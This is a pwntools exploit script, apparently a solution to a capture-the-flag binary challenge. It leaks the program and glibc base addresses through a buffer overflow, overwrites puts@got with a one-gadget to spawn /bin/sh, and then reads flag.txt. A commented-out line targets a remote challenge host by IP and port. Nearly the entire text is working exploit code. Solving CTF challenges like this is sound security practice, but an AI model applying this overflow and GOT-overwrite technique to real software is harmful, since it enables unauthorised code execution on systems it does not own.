from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    brva 0x11d5
    brva 0x1395
    continue
''')

# p = remote('34.118.61.99', 10280)

# 1. get elf base address
p.recvuntil(b"welcome, gift for today: ")
elf_base_addr = int(p.recvline().strip(), 16)-0x1265
log.info(f"elf base address: {hex(elf_base_addr)}")

# leak glibc base address through buffer overflow
# read(0, rbp-0x40, 0x3a)
p.send(b'\0'*0x38+p16((elf_base_addr+0x4010)&0xffff))
# puts(*(rbp-8))
glibc_base_addr = u64(p.recvline().strip().ljust(8, b'\x00'))-0xee230
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 3. overwrite puts@got with one gadget to pop a shell
# scanf("%lx ", rbp-0x48)
p.sendline(f"{elf_base_addr+0x4000:016x}".encode()+b' ')
# fgets(*(rbp-0x48), 5, stdin)
# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp
p.send(((glibc_base_addr+0xef4ce)&0xffffff).to_bytes(3, 'little'))
# signal(0xe, &data_0x11b9) and alarm(0x64)
sleep(0x64)
p.sendline(b'cat flag.txt')

p.interactive()